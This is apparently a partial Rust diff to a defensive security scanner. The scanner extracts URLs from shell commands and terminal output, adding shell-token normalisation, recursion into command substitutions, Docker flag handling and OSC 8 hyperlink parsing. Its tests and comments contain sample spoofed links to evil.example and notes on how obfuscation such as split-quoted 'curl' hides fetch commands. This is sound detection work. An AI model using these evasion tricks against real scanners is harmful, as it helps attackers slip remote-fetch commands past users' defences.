@@ -54,7 +54,7 @@ static TIER1_PASTE_REGEX: Lazy<Regex> = Lazy::new(|| {
 /// Standard URL extraction regex for Tier 3.
 static URL_REGEX: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?:(?:https?|ftp|ssh|git)://[^\s'"<>]+)|(?:[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+:[^\s'"<>]+)"#,
+        r#"(?i:(?:(?:https?|ftp|ssh|git)://[^\s'"<>]+)|(?:[a-z0-9._-]+@[a-z0-9._-]+:[^\s'"<>]+))"#,
     )
     .expect("url regex must compile")
 });
@@ -139,6 +139,19 @@ pub fn tier1_scan(input: &str, context: ScanContext) -> bool {
         // FileScan always proceeds to tier-3 (no fast-exit)
         ScanContext::FileScan => true,
     }
+}
+
+/// Tier-1 scan over both the evidence spelling and the shell-effective text.
+///
+/// The raw pass preserves the generated fast-path contract. The normalized pass
+/// prevents shell word concatenation (`c"ur"l`) and escapes from hiding a real
+/// source command or URL before Tier 3 has a chance to parse it.
+pub fn tier1_scan_for_shell(input: &str, context: ScanContext, shell: ShellType) -> bool {
+    if tier1_scan(input, context) {
+        return true;
+    }
+    let normalized = crate::rules::command::normalize_shell_token(input, shell);
+    normalized != input && tier1_scan(&normalized, context)
 }
 
 /// Decode exactly one UTF-8 scalar from the start of `input`.
@@ -962,8 +975,13 @@ fn finalize_osc(
                 .unwrap_or(&payload_str)
                 .to_string();
             let uri = stripped_uri;
-            if state.osc8_active_uri.is_some() {
-                // This is the CLOSER — emit the captured link.
+            if uri.is_empty() {
+                // Only an empty URI is an OSC 8 closer. An unmatched closer is
+                // a harmless state reset; it must never open an empty link.
+                if state.osc8_active_uri.is_none() {
+                    reset_osc_state(state, OutputPhase::Idle);
+                    return;
+                }
                 let visible = std::str::from_utf8(&state.osc8_visible_buf)
                     .unwrap_or("")
                     .to_string();
@@ -976,7 +994,19 @@ fn finalize_osc(
                 state.osc8_visible_buf.clear();
                 state.phase = OutputPhase::Idle;
             } else {
-                // OPENER — start collecting the visible label.
+                // A non-empty OSC 8 always opens (or replaces) a link. When a
+                // terminal receives a second opener it associates subsequent
+                // text with the new URI, so finalize the prior span first.
+                if let Some(captured_uri) = state.osc8_active_uri.take() {
+                    let visible = std::str::from_utf8(&state.osc8_visible_buf)
+                        .unwrap_or("")
+                        .to_string();
+                    result.hyperlinks.push(OutputHyperlinkHit {
+                        offset: state.osc8_uri_start_offset,
+                        uri: captured_uri,
+                        visible,
+                    });
+                }
                 state.osc8_active_uri = Some(uri);
                 state.osc8_uri_start_offset = abs_offset;
                 state.osc8_visible_buf.clear();
@@ -1113,6 +1143,23 @@ mod output_scan_tests {
         assert_eq!(result.hyperlinks.len(), 1, "should detect OSC 8");
         assert_eq!(result.hyperlinks[0].uri, "https://evil.example");
         assert_eq!(result.hyperlinks[0].visible, "github.com");
+    }
+
+    #[test]
+    fn second_non_empty_osc8_opener_replaces_the_active_uri() {
+        let input = b"\x1b]8;;https://benign.example\x1b\\old\x1b]8;;https://evil.example\x1b\\trusted.example\x1b]8;;\x1b\\";
+        let result = scan_output_bytes(input);
+        assert_eq!(result.hyperlinks.len(), 2);
+        assert_eq!(result.hyperlinks[0].uri, "https://benign.example");
+        assert_eq!(result.hyperlinks[0].visible, "old");
+        assert_eq!(result.hyperlinks[1].uri, "https://evil.example");
+        assert_eq!(result.hyperlinks[1].visible, "trusted.example");
+    }
+
+    #[test]
+    fn unmatched_empty_osc8_uri_is_only_a_closer() {
+        let result = scan_output_bytes(b"\x1b]8;;\x1b\\plain text");
+        assert!(result.hyperlinks.is_empty());
     }
 
     #[test]
@@ -1401,39 +1448,71 @@ pub(crate) fn strip_invisible(s: &str) -> String {
 
 /// Tier 3: shell-aware tokenize, then extract URL-like patterns per segment.
 pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
-    let segments = tokenize::tokenize(input, shell);
+    let extracted = extract_urls_depth(input, shell, 0);
+    let mut deduplicated: Vec<ExtractedUrl> = Vec::new();
+    for candidate in extracted {
+        let identity = candidate.parsed.raw_str();
+        if let Some(existing) = deduplicated.iter_mut().find(|existing| {
+            existing.segment_index == candidate.segment_index
+                && existing.parsed.raw_str() == identity
+        }) {
+            // Recursive inspection of a command substitution carries the true
+            // nested sink context and must win over a raw fallback match.
+            existing.in_sink_context |= candidate.in_sink_context;
+        } else {
+            deduplicated.push(candidate);
+        }
+    }
+    deduplicated
+}
+
+const MAX_SUBSTITUTION_DEPTH: usize = 8;
+
+fn extract_urls_depth(input: &str, shell: ShellType, depth: usize) -> Vec<ExtractedUrl> {
+    if depth > MAX_SUBSTITUTION_DEPTH {
+        return Vec::new();
+    }
+    let heredocs = (shell == ShellType::Posix).then(|| recover_posix_heredocs(input));
+    let scan_input = heredocs
+        .as_ref()
+        .map_or(input, |recovery| recovery.sanitized.as_str());
+    let segments = tokenize::tokenize(scan_input, shell);
     let mut results = Vec::new();
 
     for (seg_idx, segment) in segments.iter().enumerate() {
-        let sink_context = is_sink_context(segment, &segments);
-        let resolved = resolve_segment_command(segment);
+        let sink_context = is_sink_context(segment, &segments, shell);
+        let resolved = resolve_segment_command_for_shell(segment, shell);
 
         // Suppress URL extraction ONLY for the arg span of a first-segment
         // tirith inspection subcommand — not the whole segment. Leading env
         // assignments and wrapper tokens (sudo/env/time) must still be analyzed
         // (`FOO=https://evil.com tirith diff safe` must still flag FOO), so first
         // locate where the literal "tirith" word lives in the segment.
-        let inspection_skip_args_from: Option<usize> = if seg_idx == 0 {
+        let inspection_subcommand_index: Option<usize> = if seg_idx == 0 {
             resolved.as_ref().and_then(|cmd| {
                 if cmd.name != "tirith" {
                     return None;
                 }
-                let start_from: usize =
-                    if segment.command.as_deref().map(command_base_name).as_deref()
-                        == Some("tirith")
-                    {
-                        0
-                    } else {
-                        let at = segment
-                            .args
-                            .iter()
-                            .position(|a| command_base_name(a) == "tirith")?;
-                        at + 1
-                    };
+                let start_from: usize = if segment
+                    .command
+                    .as_deref()
+                    .map(|command| command_base_name_for_shell(command, shell))
+                    .as_deref()
+                    == Some("tirith")
+                {
+                    0
+                } else {
+                    let at = segment
+                        .args
+                        .iter()
+                        .position(|a| command_base_name_for_shell(a, shell) == "tirith")?;
+                    at + 1
+                };
                 // Skip flags (e.g. `--quiet`) to land on the subcommand token.
                 let mut i = start_from;
                 while i < segment.args.len() {
-                    let clean = strip_quotes(&segment.args[i]);
+                    let clean =
+                        crate::rules::command::normalize_shell_token(&segment.args[i], shell);
                     if clean.starts_with('-') {
                         i += 1;
                         continue;
@@ -1441,7 +1520,7 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
                     break;
                 }
                 let sub_arg = segment.args.get(i)?;
-                if is_tirith_inspection_subcommand(&command_base_name(sub_arg)) {
+                if is_tirith_inspection_subcommand(&command_base_name_for_shell(sub_arg, shell)) {
                     Some(i)
                 } else {
                     None
@@ -1451,17 +1530,42 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
             None
         };
 
+        if inspection_subcommand_index.is_some() {
+            // Backtick substitutions may span multiple whitespace-tokenized
+            // args, so recover executable bodies from the original segment in
+            // addition to the per-token malformed-syntax fallback below.
+            for substitution in executable_substitutions(&segment.raw, shell) {
+                for mut nested in extract_urls_depth(&substitution, shell, depth + 1) {
+                    nested.segment_index = seg_idx;
+                    results.push(nested);
+                }
+            }
+        }
+
         // Extract URLs from command + args + leading env-assignment values.
         let mut url_sources: Vec<&str> = Vec::new();
         if let Some(ref cmd) = segment.command {
             url_sources.push(cmd.as_str());
         }
         for (arg_idx, arg) in segment.args.iter().enumerate() {
-            // For tirith inspection subcommands, the subcommand word and all
-            // later args are the inert arg span — skip URL extraction there.
-            if let Some(skip_from) = inspection_skip_args_from {
-                if arg_idx >= skip_from {
-                    break;
+            if let Some(subcommand_index) = inspection_subcommand_index {
+                if arg_idx == subcommand_index {
+                    continue;
+                }
+                if arg_idx > subcommand_index {
+                    if shell_word_is_proven_literal(arg, shell) {
+                        continue;
+                    }
+                    // Shell substitutions execute before `tirith` receives its
+                    // inspection argv. Analyze each nested command with its own
+                    // leader/sink context, then keep a direct URL fallback for
+                    // malformed-but-active syntax.
+                    for substitution in executable_substitutions(arg, shell) {
+                        for mut nested in extract_urls_depth(&substitution, shell, depth + 1) {
+                            nested.segment_index = seg_idx;
+                            results.push(nested);
+                        }
+                    }
                 }
             }
             url_sources.push(arg.as_str());
@@ -1472,11 +1576,11 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
             }
             let clean = strip_quotes(&value);
             if !clean.is_empty() {
-                push_urls_from_source(&clean, seg_idx, sink_context, &mut results);
+                push_urls_from_source(&clean, shell, seg_idx, sink_context, &mut results);
             }
         }
         for source in &url_sources {
-            push_urls_from_source(source, seg_idx, sink_context, &mut results);
+            push_urls_from_source(source, shell, seg_idx, sink_context, &mut results);
         }
 
         // Schemeless URLs in sink contexts. Skip docker/podman/nerdctl — their
@@ -1497,14 +1601,24 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
                 let go_install_skip_from = if cmd.name == "go" {
                     cmd.args
                         .iter()
-                        .position(|a| matches!(a.to_lowercase().as_str(), "install" | "get"))
+                        .position(|arg| {
+                            matches!(
+                                crate::rules::command::normalize_shell_token(arg, shell)
+                                    .to_lowercase()
+                                    .as_str(),
+                                "install" | "get"
+                            )
+                        })
                         .map(|pos| pos + 1)
                 } else {
                     None
                 };
                 for (arg_idx, arg) in cmd.args.iter().enumerate() {
                     // Skip args that are output-file flag values
-                    if is_output_flag_value(&cmd.name, cmd.args, arg_idx) {
+                    if is_non_destination_flag_value(&cmd.name, &cmd.args, arg_idx, shell) {
+                        continue;
+                    }
+                    if is_registry_package_operand(&cmd.name, &cmd.args, arg_idx, shell) {
                         continue;
                     }
                     if let Some(skip_from) = go_install_skip_from {
@@ -1512,20 +1626,20 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
                             continue;
                         }
                     }
-                    let clean = strip_quotes(arg);
+                    let clean = crate::rules::command::normalize_shell_token(arg, shell);
                     if is_remote_copy {
                         // Validate the spec shape (for downstream policy) but
                         // never emit schemeless for remote specs or local files.
                         let _ = parse_scp_remote_spec(&clean, shell);
                         continue;
                     }
-                    if looks_like_schemeless_host(&clean) && !URL_REGEX.is_match(&clean) {
+                    if !URL_REGEX.is_match(&clean) {
+                        let Some(parsed) = parse_schemeless_destination(&clean) else {
+                            continue;
+                        };
                         results.push(ExtractedUrl {
                             raw: clean.clone(),
-                            parsed: UrlLike::SchemelessHostPath {
-                                host: extract_host_from_schemeless(&clean),
-                                path: extract_path_from_schemeless(&clean),
-                            },
+                            parsed,
                             segment_index: seg_idx,
                             in_sink_context: true,
                         });
@@ -1538,15 +1652,21 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
         if let Some(cmd) = resolved.as_ref() {
             if matches!(cmd.name.as_str(), "docker" | "podman" | "nerdctl") {
                 if let Some(docker_subcmd) = cmd.args.first() {
-                    let subcmd_lower = docker_subcmd.to_lowercase();
+                    let subcmd_lower =
+                        crate::rules::command::normalize_shell_token(docker_subcmd, shell)
+                            .to_lowercase();
                     if subcmd_lower == "build" {
                         // `docker build` takes the image ref from -t/--tag.
                         // Every other arg is build context / flags.
                         let mut i = 1;
                         while i < cmd.args.len() {
-                            let arg = strip_quotes(&cmd.args[i]);
+                            let arg =
+                                crate::rules::command::normalize_shell_token(&cmd.args[i], shell);
                             if (arg == "-t" || arg == "--tag") && i + 1 < cmd.args.len() {
-                                let tag_val = strip_quotes(&cmd.args[i + 1]);
+                                let tag_val = crate::rules::command::normalize_shell_token(
+                                    &cmd.args[i + 1],
+                                    shell,
+                                );
                                 if !tag_val.is_empty() {
                                     let docker_url = parse::parse_docker_ref(&tag_val);
                                     results.push(ExtractedUrl {
@@ -1558,7 +1678,7 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
                                 }
                                 i += 2;
                             } else if arg.starts_with("-t") && arg.len() > 2 {
-                                let tag_val = strip_quotes(&arg[2..]);
+                                let tag_val = arg[2..].to_string();
                                 let docker_url = parse::parse_docker_ref(&tag_val);
                                 results.push(ExtractedUrl {
                                     raw: tag_val,
@@ -1568,7 +1688,7 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
                                 });
                                 i += 1;
                             } else if let Some(val) = arg.strip_prefix("--tag=") {
-                                let tag_val = strip_quotes(val);
+                                let tag_val = val.to_string();
                                 let docker_url = parse::parse_docker_ref(&tag_val);
                                 results.push(ExtractedUrl {
                                     raw: tag_val,
@@ -1584,21 +1704,45 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
                     } else if subcmd_lower == "image" {
                         // `docker image pull/push/...` — real subcommand is args[1].
                         if let Some(image_subcmd) = cmd.args.get(1) {
-                            let image_subcmd_lower = image_subcmd.to_lowercase();
+                            let image_subcmd_lower =
+                                crate::rules::command::normalize_shell_token(image_subcmd, shell)
+                                    .to_lowercase();
                             if matches!(
                                 image_subcmd_lower.as_str(),
                                 "pull" | "push" | "inspect" | "rm" | "tag"
                             ) {
-                                extract_first_docker_image(&cmd.args[2..], seg_idx, &mut results);
+                                extract_first_docker_image(
+                                    &cmd.args[2..],
+                                    &image_subcmd_lower,
+                                    shell,
+                                    seg_idx,
+                                    &mut results,
+                                );
                             }
                         }
                     } else if matches!(subcmd_lower.as_str(), "pull" | "run" | "create") {
                         // First non-flag arg is the image; any later args are
                         // arguments to the containerized command, not refs.
-                        extract_first_docker_image(&cmd.args[1..], seg_idx, &mut results);
+                        extract_first_docker_image(
+                            &cmd.args[1..],
+                            &subcmd_lower,
+                            shell,
+                            seg_idx,
+                            &mut results,
+                        );
                     }
                 }
             }
+        }
+    }
+
+    // Re-run extraction inside every statically executable body with the shell
+    // that will actually parse it. The outer token view can see URL text but not
+    // the nested leader, so without this pass `sh -c 'curl http://…'` and
+    // PowerShell invocation groups lose their sink context.
+    if depth < MAX_SUBSTITUTION_DEPTH {
+        for body in executable_substitution_scan(input, shell).bodies {
+            results.extend(extract_urls_depth(&body.input, body.shell, depth + 1));
         }
     }
 
@@ -1662,37 +1806,125 @@ const DOCKER_VALUE_FLAGS: &[&str] = &[
     "--pid",
     "--userns",
     "--cgroupns",
+    "--annotation",
+    "--attach",
+    "--blkio-weight",
+    "--cap-add",
+    "--cap-drop",
+    "--cgroup-parent",
+    "--cidfile",
+    "--cpu-period",
+    "--cpu-rt-period",
+    "--cpu-rt-runtime",
+    "--cpuset-cpus",
+    "--cpuset-mems",
+    "--dns",
+    "--dns-option",
+    "--dns-search",
+    "--domainname",
+    "--group-add",
+    "--health-cmd",
+    "--health-interval",
+    "--health-retries",
+    "--health-start-interval",
+    "--health-start-period",
+    "--health-timeout",
+    "--init-path",
+    "--io-maxbandwidth",
+    "--io-maxiops",
+    "--ip",
+    "--ip6",
+    "--kernel-memory",
+    "--link",
+    "--link-local-ip",
+    "--mac-address",
+    "--memory-swappiness",
+    "--oom-score-adj",
+    "--pids-limit",
+    "--pull",
+    "--stop-signal",
+    "--stop-timeout",
+    "--storage-opt",
+    "--uts",
 ];
+
+/// Options whose presence never consumes the following argv. Unknown options
+/// are not assumed boolean: Docker adds flags over time and guessing would let a
+/// value token masquerade as the image.
+const DOCKER_BOOLEAN_FLAGS: &[&str] = &[
+    "--detach",
+    "-d",
+    "--disable-content-trust",
+    "--help",
+    "--init",
+    "--interactive",
+    "-i",
+    "--no-healthcheck",
+    "--oom-kill-disable",
+    "--privileged",
+    "--publish-all",
+    "-P",
+    "--quiet",
+    "-q",
+    "--read-only",
+    "--rm",
+    "--sig-proxy",
+    "--tty",
+    "-t",
+];
+
+fn docker_option_takes_value(option: &str, subcommand: &str) -> bool {
+    DOCKER_VALUE_FLAGS.contains(&option)
+        || (matches!(subcommand, "run" | "create") && option == "-a")
+}
+
+fn docker_option_is_boolean(option: &str, subcommand: &str) -> bool {
+    DOCKER_BOOLEAN_FLAGS.contains(&option)
+        || (subcommand == "pull" && matches!(option, "--all-tags" | "-a"))
+}
 
 /// Short flags that may embed their value inline (e.g., -p8080:80).
 const DOCKER_VALUE_PREFIXES: &[&str] = &["-p", "-e", "-v", "-l", "-u", "-w"];
 
 /// Extract the first non-flag argument as a Docker image reference.
-fn extract_first_docker_image(args: &[String], seg_idx: usize, results: &mut Vec<ExtractedUrl>) {
+fn extract_first_docker_image(
+    args: &[String],
+    subcommand: &str,
+    shell: ShellType,
+    seg_idx: usize,
+    results: &mut Vec<ExtractedUrl>,
+) {
     let mut skip_next = false;
     let mut end_of_options = false;
+    let mut ambiguous_option_grammar = false;
     for arg in args {
         if skip_next {
             skip_next = false;
             continue;
         }
-        let clean = strip_quotes(arg);
+        let clean = crate::rules::command::normalize_shell_token(arg, shell);
         if clean == "--" {
             end_of_options = true;
+            ambiguous_option_grammar = false;
             continue;
         }
         if !end_of_options && clean.starts_with("--") && clean.contains('=') {
             continue;
         }
         if !end_of_options && clean.starts_with('-') {
-            if DOCKER_VALUE_FLAGS.iter().any(|f| clean == *f) {
+            if docker_option_takes_value(&clean, subcommand) {
                 skip_next = true;
-            }
-            if DOCKER_VALUE_PREFIXES
+            } else if DOCKER_VALUE_PREFIXES
                 .iter()
                 .any(|p| clean.starts_with(p) && clean.len() > p.len())
             {
                 continue;
+            } else if !docker_option_is_boolean(&clean, subcommand) {
+                // We cannot prove whether a newly-added/unknown option consumes
+                // the next argv. Retain every later positional as a candidate so
+                // the real image is still inspected; never stop on the possible
+                // option value as if it were authoritative.
+                ambiguous_option_grammar = true;
             }
             continue;
         }
@@ -1705,25 +1937,30 @@ fn extract_first_docker_image(args: &[String], seg_idx: usize, results: &mut Vec
                 in_sink_context: true,
             });
         }
-        // Only the FIRST non-flag arg is the image; anything else is the
-        // containerized command's argv.
-        break;
+        // Under known grammar the first positional is authoritative. Under an
+        // unknown option, keep scanning conservative candidates rather than
+        // blessing its possible value and dropping the actual image.
+        if !ambiguous_option_grammar {
+            break;
+        }
     }
 }
 
 #[derive(Debug, Clone)]
-struct ResolvedCommand<'a> {
+struct ResolvedCommand {
     name: String,
-    args: &'a [String],
+    args: Vec<String>,
 }
 
 fn push_urls_from_source(
     source: &str,
+    shell: ShellType,
     segment_index: usize,
     in_sink_context: bool,
     results: &mut Vec<ExtractedUrl>,
 ) {
-    for mat in URL_REGEX.find_iter(source) {
+    let normalized = crate::rules::command::normalize_shell_token(source, shell);
+    for mat in URL_REGEX.find_iter(&normalized) {
         let raw = mat.as_str().to_string();
         let url = parse::parse_url(&raw);
         results.push(ExtractedUrl {
@@ -1740,28 +1977,37 @@ fn ignores_env_assignment_url(name: &str) -> bool {
     upper == "NO_PROXY" || upper.ends_with("_PROXY")
 }
 
-fn env_long_flag_takes_value(flag: &str) -> bool {
-    let name = flag.split_once('=').map(|(name, _)| name).unwrap_or(flag);
-    matches!(name, "--unset" | "--chdir" | "--split-string")
+fn command_base_name_for_shell(raw: &str, shell: ShellType) -> String {
+    crate::rules::command::normalize_cmd_base(raw, shell)
 }
 
-fn command_base_name(raw: &str) -> String {
-    let clean = strip_quotes(raw);
-    clean
-        .rsplit(['/', '\\'])
-        .next()
-        .unwrap_or(clean.as_str())
-        .to_lowercase()
+fn resolve_segment_command_for_shell(
+    segment: &Segment,
+    shell: ShellType,
+) -> Option<ResolvedCommand> {
+    if shell == ShellType::PowerShell && powershell_segment_root_is_string_data(segment) {
+        // A quoted expression is data unless PowerShell's call operator (`&`)
+        // or dot-sourcing syntax is the actual root command. Wrapper peeling
+        // must not reinterpret a bare string such as `"pwsh" -Command ...` as
+        // an invocation.
+        return None;
+    }
+    let effective = crate::rules::command::resolve_effective_segment(segment, shell).ok()?;
+    let command = effective.command.as_ref()?;
+    let name = command_base_name_for_shell(command, shell);
+    if name == "tirith" {
+        resolve_tirith_command(&effective.args, shell)
+    } else {
+        Some(ResolvedCommand {
+            name,
+            args: effective.args,
+        })
+    }
 }
 
-fn resolve_segment_command(segment: &Segment) -> Option<ResolvedCommand<'_>> {
-    let command = segment.command.as_ref()?;
-    resolve_named_command(command, &segment.args)
+fn resolve_segment_command(segment: &Segment) -> Option<ResolvedCommand> {
+    resolve_segment_command_for_shell(segment, ShellType::Posix)
 }
-
-/// Bound recursive wrapper peeling independently of attacker-controlled argv
-/// length. Exhaustion is unresolved, never a partially trusted inner command.
-const MAX_WRAPPED_COMMAND_DEPTH: usize = 64;
 
 /// Resolve a segment's command through wrappers (`env`, `command`, `time`,
 /// `sudo`/`doas`, `tirith`) and return the resolved name and the wrapped
@@ -1769,203 +2015,8259 @@ const MAX_WRAPPED_COMMAND_DEPTH: usize = 64;
 /// use this so wrapped invocations like `sudo curl …` or `env curl …` get the
 /// same policy treatment as the bare command.
 ///
-/// Returns `None` if the segment has no command or the wrapper chain can't be
-/// resolved (e.g. `sudo` with no command word).
+/// Returns `None` if the segment has no command or the wrapper chain cannot be
+/// resolved unambiguously. A terminal wrapper invocation such as bare `sudo`
+/// remains resolved to that wrapper because it does not execute an inner command.
 pub fn resolve_wrapped_command(segment: &Segment) -> Option<(String, Vec<String>)> {
     let resolved = resolve_segment_command(segment)?;
-    Some((resolved.name, resolved.args.to_vec()))
+    Some((resolved.name, resolved.args))
 }
 
-fn resolve_named_command<'a>(command: &str, args: &'a [String]) -> Option<ResolvedCommand<'a>> {
-    resolve_named_command_depth(command, args, MAX_WRAPPED_COMMAND_DEPTH)
+/// Shell-aware wrapper resolution for enforcement paths that already carry the
+/// selected shell. The legacy entry point above remains POSIX-compatible.
+pub fn resolve_wrapped_command_for_shell(
+    segment: &Segment,
+    shell: ShellType,
+) -> Option<(String, Vec<String>)> {
+    let resolved = resolve_segment_command_for_shell(segment, shell)?;
+    Some((resolved.name, resolved.args))
 }
 
-fn resolve_named_command_depth<'a>(
-    command: &str,
-    args: &'a [String],
-    depth: usize,
-) -> Option<ResolvedCommand<'a>> {
-    if depth == 0 {
-        return None;
-    }
-    let name = command_base_name(command);
-    match name.as_str() {
-        "env" => resolve_env_command(args, depth - 1),
-        "command" => resolve_command_wrapper(args, depth - 1),
-        "time" => resolve_time_wrapper(args, depth - 1),
-        "sudo" | "doas" => resolve_sudo_wrapper(args, depth - 1),
-        "tirith" => resolve_tirith_command(args),
-        _ => Some(ResolvedCommand { name, args }),
-    }
-}
-
-/// Resolve through a `sudo`/`doas` wrapper to the real command, handling the
-/// common flag shapes (`-u user`, `--user=user`, `-E -H`, leading `VAR=val`).
-/// Conservative: returns None when the command can't be unambiguously resolved,
-/// so the caller falls back to the literal first token.
-fn resolve_sudo_wrapper(args: &[String], depth: usize) -> Option<ResolvedCommand<'_>> {
-    // Short sudo(8) flags that take a VALUE. Boolean-only flags (-S -A -B -E -H
-    // -K -L -l -n -P -s -V -v, and -h=--help not --host) must NOT be here —
-    // treating them as value-taking would eat the next token.
-    const SUDO_VALUE_FLAGS: &[&str] = &["-u", "-g", "-p", "-C", "-D", "-U", "-r", "-t"];
-    // Long flags that take a value unless combined with `=`.
-    const SUDO_LONG_VALUE_FLAGS: &[&str] = &[
-        "--user",
-        "--group",
-        "--prompt",
-        "--close-from",
-        "--chdir",
-        "--other-user",
-        "--role",
-        "--type",
-        "--host",
-    ];
-
-    let mut i = 0;
-    let mut after_dashdash = false;
-    while i < args.len() {
-        let clean = strip_quotes(&args[i]);
-        if !after_dashdash && clean == "--" {
-            after_dashdash = true;
-            i += 1;
-            continue;
-        }
-        // Env-style assignments before the command (sudo VAR=val cmd)
-        if !after_dashdash && tokenize::is_env_assignment(&clean) {
-            i += 1;
-            continue;
-        }
-        if !after_dashdash && clean.starts_with("--") {
-            let name_part = clean.split_once('=').map(|(n, _)| n).unwrap_or(&clean);
-            if !clean.contains('=') && SUDO_LONG_VALUE_FLAGS.contains(&name_part) {
-                i += 2;
-            } else {
-                i += 1;
-            }
-            continue;
-        }
-        if !after_dashdash && clean.starts_with('-') {
-            if SUDO_VALUE_FLAGS.contains(&clean.as_str()) {
-                i += 2;
-                continue;
-            }
-            i += 1;
-            continue;
-        }
-        // First non-flag, non-assignment argument is the wrapped command.
-        return resolve_named_command_depth(&clean, &args[i + 1..], depth);
-    }
-    None
-}
-
-fn resolve_env_command(args: &[String], depth: usize) -> Option<ResolvedCommand<'_>> {
-    let mut i = 0;
-    while i < args.len() {
-        let clean = strip_quotes(&args[i]);
-        if clean == "--" {
-            i += 1;
-            break;
-        }
-        if tokenize::is_env_assignment(&clean) {
-            i += 1;
-            continue;
-        }
-        if clean.starts_with('-') {
-            if clean.starts_with("--") {
-                if env_long_flag_takes_value(&clean) && !clean.contains('=') {
-                    i += 2;
-                } else {
-                    i += 1;
-                }
-                continue;
-            }
-            if clean == "-u" || clean == "-C" || clean == "-S" {
-                i += 2;
-                continue;
-            }
-            i += 1;
-            continue;
-        }
-        return resolve_named_command_depth(&clean, &args[i + 1..], depth);
-    }
-
-    while i < args.len() {
-        let clean = strip_quotes(&args[i]);
-        if tokenize::is_env_assignment(&clean) {
-            i += 1;
-            continue;
-        }
-        return resolve_named_command_depth(&clean, &args[i + 1..], depth);
-    }
-
-    None
-}
-
-fn resolve_command_wrapper(args: &[String], depth: usize) -> Option<ResolvedCommand<'_>> {
-    let mut i = 0;
-    while i < args.len() {
-        let clean = strip_quotes(&args[i]);
-        if clean == "--" {
-            i += 1;
-            break;
-        }
-        if clean.starts_with('-') {
-            i += 1;
-            continue;
-        }
-        break;
-    }
-    args.get(i)
-        .and_then(|arg| resolve_named_command_depth(arg, &args[i + 1..], depth))
-}
-
-fn resolve_time_wrapper(args: &[String], depth: usize) -> Option<ResolvedCommand<'_>> {
-    let mut i = 0;
-    while i < args.len() {
-        let clean = strip_quotes(&args[i]);
-        if clean == "--" {
-            i += 1;
-            break;
-        }
-        if clean.starts_with('-') {
-            if clean == "-f" || clean == "--format" || clean == "-o" || clean == "--output" {
-                i += 2;
-            } else {
-                i += 1;
-            }
-            continue;
-        }
-        break;
-    }
-    args.get(i)
-        .and_then(|arg| resolve_named_command_depth(arg, &args[i + 1..], depth))
-}
-
-fn resolve_tirith_command(args: &[String]) -> Option<ResolvedCommand<'_>> {
-    let subcommand = args.first().map(|arg| command_base_name(arg))?;
+fn resolve_tirith_command(args: &[String], shell: ShellType) -> Option<ResolvedCommand> {
+    let subcommand = args
+        .first()
+        .map(|arg| command_base_name_for_shell(arg, shell))?;
     match subcommand.as_str() {
         "run" => Some(ResolvedCommand {
             name: "tirith-run".to_string(),
-            args: &args[1..],
+            args: args[1..].to_vec(),
         }),
         _ => Some(ResolvedCommand {
             name: "tirith".to_string(),
-            args,
+            args: args.to_vec(),
         }),
     }
 }
 
 /// Whether a tirith subcommand is an "inspection" command (describe/score a
-/// deliberately-typed suspicious input, not execute it), for which URL
-/// extraction and the exec-context byte-scan are suppressed. Deliberately
-/// narrow — adding anything else requires a motivating false-positive fixture.
+/// deliberately-typed suspicious input, not execute it), for which proven
+/// literal args may skip URL extraction and the exec-context byte scan.
+/// Deliberately narrow — adding anything else requires a motivating
+/// false-positive fixture.
 fn is_tirith_inspection_subcommand(sub: &str) -> bool {
     matches!(sub, "diff" | "score" | "why" | "receipt" | "explain")
 }
 
+/// `true` only when the shell spelling cannot execute or synthesize additional
+/// argv content before Tirith receives it. This is intentionally stricter than
+/// token normalization: the inspection carveout is an optimization, so any
+/// ambiguity safely falls back to full analysis.
+fn shell_word_is_proven_literal(raw: &str, shell: ShellType) -> bool {
+    #[derive(Clone, Copy, PartialEq, Eq)]
+    enum Quote {
+        Normal,
+        Single,
+        Double,
+        AnsiC,
+    }
+
+    let chars: Vec<char> = raw.chars().collect();
+    let mut quote = Quote::Normal;
+    let mut i = 0;
+    while i < chars.len() {
+        let ch = chars[i];
+        match quote {
+            Quote::Single => {
+                if ch == '\'' {
+                    if shell == ShellType::PowerShell
+                        && chars.get(i + 1).is_some_and(|next| *next == '\'')
+                    {
+                        i += 2;
+                        continue;
+                    }
+                    quote = Quote::Normal;
+                }
+            }
+            Quote::Double => {
+                if ch == '"' {
+                    quote = Quote::Normal;
+                } else if (ch == '$' && shell != ShellType::Cmd)
+                    || (shell == ShellType::PowerShell && ch == '`')
+                    || (!matches!(shell, ShellType::PowerShell | ShellType::Cmd) && ch == '`')
+                    || (!matches!(shell, ShellType::PowerShell | ShellType::Cmd) && ch == '\\')
+                {
+                    return false;
+                }
+            }
+            Quote::AnsiC => {
+                if ch == '\'' {
+                    quote = Quote::Normal;
+                } else if ch == '\\' {
+                    if i + 1 >= chars.len() {
+                        return false;
+                    }
+                    i += 1;
+                }
+            }
+            Quote::Normal => {
+                if shell == ShellType::Posix
+                    && ch == '$'
+                    && chars.get(i + 1).is_some_and(|next| *next == '\'')
+                {
+                    quote = Quote::AnsiC;
+                    i += 1;
+                } else if ch == '\'' && shell != ShellType::Cmd {
+                    quote = Quote::Single;
+                } else if ch == '"' {
+                    quote = Quote::Double;
+                } else {
+                    let active = match shell {
+                        ShellType::Posix | ShellType::Fish => {
+                            matches!(
+                                ch,
+                                '$' | '`' | '\\' | '*' | '?' | '[' | ']' | '{' | '}' | '~'
+                            ) || (matches!(ch, '<' | '>')
+                                && chars.get(i + 1).is_some_and(|next| *next == '('))
+                                || (shell == ShellType::Fish && ch == '(')
+                        }
+                        ShellType::PowerShell => matches!(ch, '$' | '`' | '@' | '*' | '?' | '['),
+                        ShellType::Cmd => matches!(ch, '%' | '!' | '^' | '*' | '?'),
+                    };
+                    if active {
+                        return false;
+                    }
+                }
+            }
+        }
+        i += 1;
+    }
+    quote == Quote::Normal
+}
+
